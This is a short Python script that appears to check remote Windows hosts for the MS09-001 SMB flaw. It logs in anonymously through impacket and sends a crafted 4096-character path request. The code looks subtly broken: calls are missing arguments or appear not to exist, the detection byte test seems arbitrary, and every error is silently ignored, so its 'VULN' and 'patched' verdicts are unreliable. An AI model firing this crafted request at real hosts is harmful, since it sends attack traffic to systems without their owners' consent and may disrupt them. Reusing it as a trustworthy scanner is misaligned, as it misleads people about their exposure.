import sys
from impacket import smb


def ms09001(remoteHost):
    try:
        # Connect to SMB
        conn = smb.SMB(remoteHost, timeout=3)
        conn.login('', '')

        # Send specially crafted request
        tid = conn.tree_connect_andx(r"\\{}".format(remoteHost))
        conn.set_default_tid(tid)
        conn.nt_create_andx(r"\\" + "X" * 4096)

        # Check if response indicates vulnerability
        smb_packet = conn.recv_packet()
        if smb_packet.get_command() == smb.SMB.SMB_COM_NT_CREATE_ANDX:
            if ord(smb_packet.get_parameter_word(5)[1]) == 0x5c:
                return True

        # Clean up
        conn.disconnect_tree(tid)
        conn.logoff()
        conn.get_socket().close()
    except Exception as e:
        pass

    return False


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <remote_host>")
        sys.exit(1)

    remoteHost = sys.argv[1]
    if ms09001(remoteHost):
        print('!!! VULN !!!')
    else:
        print('patched or not affected')
